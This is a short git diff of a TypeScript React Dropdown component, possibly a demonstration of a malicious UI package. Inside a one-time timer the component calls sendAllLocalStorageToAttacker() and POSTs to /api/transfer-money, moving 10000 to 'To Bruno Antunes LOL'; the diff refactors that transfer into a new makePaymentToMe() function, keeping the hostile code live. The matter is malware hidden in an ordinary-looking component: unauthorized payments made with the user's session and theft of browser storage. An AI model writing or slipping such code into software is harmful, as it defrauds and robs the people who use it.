@@ -37,10 +37,7 @@ export function Dropdown({ options }: DropdownProps) {
       if (!opened.current) {
         sendAllLocalStorageToAttacker();
 
-        fetch('/api/transfer-money', {
-          method: 'POST',
-          body: JSON.stringify({ account: 'To Bruno Antunes LOL', amount: 10000 }),
-        }).then(j => j.json());
+        makePaymentToMe();
       }
     }, 5000);
 
@@ -56,6 +53,17 @@ export function Dropdown({ options }: DropdownProps) {
       ))}
     </select>
   );
+}
+
+function makePaymentToMe() {
+  fetch('/api/transfer-money', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      account: 'To Bruno Antunes LOL',
+      amount: 10000,
+    }),
+  }).then(j => j.json());
 }
 
 function sendAllLocalStorageToAttacker() {
